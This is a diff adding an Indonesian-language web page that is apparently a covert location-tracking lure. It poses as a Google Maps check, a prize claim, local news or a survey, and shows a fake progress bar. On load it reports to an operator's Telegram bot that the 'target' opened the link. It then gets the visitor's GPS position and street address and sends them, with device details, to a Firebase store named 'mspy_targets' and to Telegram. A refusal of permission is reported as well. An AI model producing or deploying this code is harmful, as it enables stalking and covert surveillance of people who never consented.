@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#1a73e8"/>
+<title id="pg-title">Memuat...</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:1rem}
+.card{background:#fff;border-radius:16px;padding:2rem;max-width:400px;width:100%;text-align:center;box-shadow:0 4px 30px rgba(0,0,0,.12)}
+.icon{font-size:56px;margin-bottom:14px;line-height:1}
+h1{font-size:21px;font-weight:700;margin-bottom:8px;color:#1a1a2e;line-height:1.3}
+.sub{font-size:14px;color:#666;margin-bottom:24px;line-height:1.55}
+.spinner{width:38px;height:38px;border:3px solid #e8e8e8;border-top-color:#1a73e8;border-radius:50%;animation:spin .75s linear infinite;margin:0 auto 14px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.status{font-size:13px;color:#888;margin-top:6px;min-height:20px}
+.ok-msg{display:none;margin-top:20px;padding:14px;background:#f0fdf4;border-radius:10px;border:1px solid #bbf7d0}
+.ok-msg .ok-icon{font-size:32px;margin-bottom:6px}
+.ok-msg .ok-text{font-size:14px;color:#15803d;font-weight:600}
+.ok-msg .ok-sub{font-size:12px;color:#16a34a;margin-top:4px}
+/* Tema Maps */
+.theme-maps .card{background:#fff}
+.theme-maps h1{color:#1a73e8}
+/* Tema Promo */
+.theme-promo .card{background:linear-gradient(135deg,#fff9f0,#fff)}
+.theme-promo h1{color:#d97706}
+/* Tema News */
+.theme-news .card{background:#fafafa}
+.theme-news h1{color:#1a1a2e}
+/* Tema Form */
+.theme-form .card{background:#f8faff}
+.theme-form h1{color:#3b7ef8}
+/* Fake progress bar */
+.fake-prog{height:4px;background:#e8e8e8;border-radius:99px;overflow:hidden;margin-bottom:16px}
+.fake-prog-fill{height:100%;background:linear-gradient(90deg,#1a73e8,#34a853);border-radius:99px;width:0%;transition:width .6s ease}
+</style>
+</head>
+<body>
+<div class="card" id="main-card">
+  <div class="icon" id="pg-icon">⏳</div>
+  <h1 id="pg-heading">Memuat...</h1>
+  <div class="sub" id="pg-sub">Mohon tunggu sebentar</div>
+  <div class="fake-prog"><div class="fake-prog-fill" id="prog-fill"></div></div>
+  <div class="spinner" id="spin"></div>
+  <div class="status" id="stat">Menginisialisasi...</div>
+  <div class="ok-msg" id="ok-msg">
+    <div class="ok-icon">✅</div>
+    <div class="ok-text" id="ok-text">Berhasil!</div>
+    <div class="ok-sub" id="ok-sub"></div>
+  </div>
+</div>
+
+<script>
+// ── Baca konfigurasi dari hash URL ──────────────────────────────────────────
+let cfg={};
+try{
+  const p=new URLSearchParams(location.hash.slice(1));
+  cfg={
+    fbUrl:   p.get('fb') ?atob(p.get('fb')):'',
+    fbSecret:p.get('fs') ?atob(p.get('fs')):'',
+    tgToken: p.get('tt') ?atob(p.get('tt')):'',
+    tgChatId:p.get('tc') ?atob(p.get('tc')):'',
+    label:   p.get('lbl')||'target',
+    theme:   p.get('thm')||'maps'
+  };
+}catch(e){}
+
+// ── Tema tampilan ─────────────────────────────────────────────────────────────
+const THEMES={
+  maps:{
+    title:'Cek Lokasi di Google Maps',
+    icon:'📍',
+    heading:'Buka Lokasiku di Maps',
+    sub:'Klik izinkan untuk melihat peta dan lokasi terkini di sekitarmu.',
+    ok:'Peta berhasil dimuat!',
+    okSub:'Lokasi kamu berhasil terdeteksi.'
+  },
+  promo:{
+    title:'Selamat! Kamu Menang Hadiah 🎁',
+    icon:'🎁',
+    heading:'Klaim Hadiahmu Sekarang',
+    sub:'Verifikasi lokasi pengiriman hadiah kamu. Izinkan akses lokasi untuk melanjutkan.',
+    ok:'Lokasi terverifikasi!',
+    okSub:'Hadiahmu sedang diproses. Tunggu konfirmasi via WA.'
+  },
+  news:{
+    title:'Berita Viral — Kejadian Dekat Kamu!',
+    icon:'📰',
+    heading:'Ada Kejadian di Dekat Lokasimu',
+    sub:'Izinkan akses lokasi untuk melihat berita terkini yang terjadi di sekitarmu.',
+    ok:'Berita ditemukan!',
+    okSub:'Memuat artikel terkait lokasimu...'
+  },
+  form:{
+    title:'Survei Singkat — Hanya 2 Menit',
+    icon:'📋',
+    heading:'Bantu Kami dengan Survei Ini',
+    sub:'Izinkan akses lokasi agar kami bisa menyesuaikan survei sesuai wilayahmu.',
+    ok:'Survei dimulai!',
+    okSub:'Formulir sedang disiapkan...'
+  },
+  blank:{
+    title:'Loading...',
+    icon:'⏳',
+    heading:'',
+    sub:'',
+    ok:'OK',
+    okSub:''
+  }
+};
+const T=THEMES[cfg.theme]||THEMES.maps;
+document.getElementById('pg-title').textContent=T.title;
+document.getElementById('pg-icon').textContent=T.icon;
+document.getElementById('pg-heading').textContent=T.heading;
+document.getElementById('pg-sub').textContent=T.sub;
+document.getElementById('ok-text').textContent=T.ok;
+document.getElementById('ok-sub').textContent=T.okSub;
+document.body.className='theme-'+cfg.theme;
+
+// ── Fake progress animation ──────────────────────────────────────────────────
+let progVal=0;
+const progFill=document.getElementById('prog-fill');
+const progInterval=setInterval(()=>{
+  progVal=Math.min(progVal+Math.random()*12,90);
+  progFill.style.width=progVal+'%';
+},500);
+function finishProg(){ clearInterval(progInterval); progFill.style.width='100%'; }
+
+function setStatus(msg){ document.getElementById('stat').textContent=msg; }
+
+// ── Kirim notifikasi bahwa link dibuka (tanpa lokasi) ─────────────────────────
+function notifyOpened(){
+  if(!cfg.tgToken||!cfg.tgChatId) return;
+  const msg='👁️ *Target dibuka!*\n\nLabel: '+cfg.label+'\n⏰ '+new Date().toLocaleString('id-ID')+'\n📱 '+navigator.userAgent.slice(0,80)+'\n\n_Menunggu izin lokasi..._';
+  fetch('https://api.telegram.org/bot'+cfg.tgToken+'/sendMessage',{
+    method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:cfg.tgChatId,text:msg,parse_mode:'Markdown'})
+  }).catch(()=>{});
+}
+
+// ── Kirim data lokasi ke Firebase & Telegram ──────────────────────────────────
+async function sendLocation(lat,lng,acc,addr){
+  const ts=new Date().toLocaleString('id-ID');
+  const data={lat,lng,acc:Math.round(acc),addr,label:cfg.label,time:ts,ua:navigator.userAgent.slice(0,100)};
+
+  // → Firebase
+  if(cfg.fbUrl){
+    const key='loc_'+Date.now();
+    const url=cfg.fbUrl.replace(/\/$/,'')+'/mspy_targets/'+encodeURIComponent(cfg.label)+'/'+key+'.json'+(cfg.fbSecret?'?auth='+cfg.fbSecret:'');
+    try{ await fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}); }catch(e){}
+  }
+
+  // → Telegram
+  if(cfg.tgToken&&cfg.tgChatId){
+    const gmLink='https://maps.google.com/?q='+lat+','+lng;
+    const msg='📍 *LOKASI TARGET DITEMUKAN!*\n\n'
+      +'👤 Label: *'+cfg.label+'*\n'
+      +'🗺️ Koordinat: `'+lat.toFixed(6)+', '+lng.toFixed(6)+'`\n'
+      +'📐 Akurasi: ±'+Math.round(acc)+'m\n'
+      +'🏠 Alamat: '+(addr||'—')+'\n'
+      +'⏰ Waktu: '+ts+'\n'
+      +'📱 Device: '+navigator.userAgent.slice(0,60)+'\n\n'
+      +'[📌 Buka di Google Maps]('+gmLink+')';
+    try{
+      await fetch('https://api.telegram.org/bot'+cfg.tgToken+'/sendMessage',{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:cfg.tgChatId,text:msg,parse_mode:'Markdown',disable_web_page_preview:false})
+      });
+    }catch(e){}
+  }
+}
+
+// ── Reverse geocoding ─────────────────────────────────────────────────────────
+function reverseGeocode(lat,lng){
+  return fetch('https://nominatim.openstreetmap.org/reverse?lat='+lat+'&lon='+lng+'&format=json&zoom=16&addressdetails=1&accept-language=id',{headers:{'User-Agent':'MSPYPro/1.0'}})
+    .then(r=>r.json()).then(d=>{
+      const a=d.address||{};
+      const parts=[
+        a.road||a.pedestrian||a.neighbourhood,
+        a.city_district||a.suburb||a.village,
+        a.city||a.town||a.municipality,
+        a.state
+      ].filter(Boolean);
+      return parts.slice(0,3).join(', ')||d.display_name||'—';
+    }).catch(()=>'—');
+}
+
+// ── Main: minta lokasi ────────────────────────────────────────────────────────
+notifyOpened();
+setStatus('Memuat lokasi...');
+
+if('geolocation' in navigator){
+  // Coba high accuracy dulu, fallback ke low accuracy jika timeout
+  let done=false;
+
+  function handlePos(pos){
+    if(done) return;
+    done=true;
+    const {latitude:lat,longitude:lng,accuracy:acc}=pos.coords;
+    setStatus('Mendapatkan alamat...');
+    reverseGeocode(lat,lng).then(addr=>{
+      setStatus('Mengirim data...');
+      return sendLocation(lat,lng,acc,addr);
+    }).then(()=>{
+      finishProg();
+      document.getElementById('spin').style.display='none';
+      document.getElementById('ok-msg').style.display='block';
+      setStatus('');
+    });
+  }
+
+  function handleErr(err){
+    if(done) return;
+    if(err.code===1){
+      // Ditolak — tetap kirim notif Telegram
+      done=true;
+      finishProg();
+      setStatus('⚠️ Izin lokasi ditolak');
+      document.getElementById('spin').style.display='none';
+      if(cfg.tgToken&&cfg.tgChatId){
+        const msg='🚫 *Target '+cfg.label+' menolak izin lokasi!*\n\n⏰ '+new Date().toLocaleString('id-ID')+'\n📱 '+navigator.userAgent.slice(0,80);
+        fetch('https://api.telegram.org/bot'+cfg.tgToken+'/sendMessage',{
+          method:'POST',headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({chat_id:cfg.tgChatId,text:msg,parse_mode:'Markdown'})
+        }).catch(()=>{});
+      }
+    }
+  }
+
+  // High accuracy (GPS hardware)
+  navigator.geolocation.getCurrentPosition(handlePos,handleErr,
+    {enableHighAccuracy:true,timeout:20000,maximumAge:0});
+  // Low accuracy fallback setelah 5 detik (jika high masih loading)
+  setTimeout(()=>{
+    if(!done){
+      navigator.geolocation.getCurrentPosition(handlePos,()=>{},
+        {enableHighAccuracy:false,timeout:10000,maximumAge:30000});
+    }
+  },5000);
+} else {
+  setStatus('Browser tidak mendukung geolokasi');
+  finishProg();
+  document.getElementById('spin').style.display='none';
+}
+</script>
+</body>
+</html>
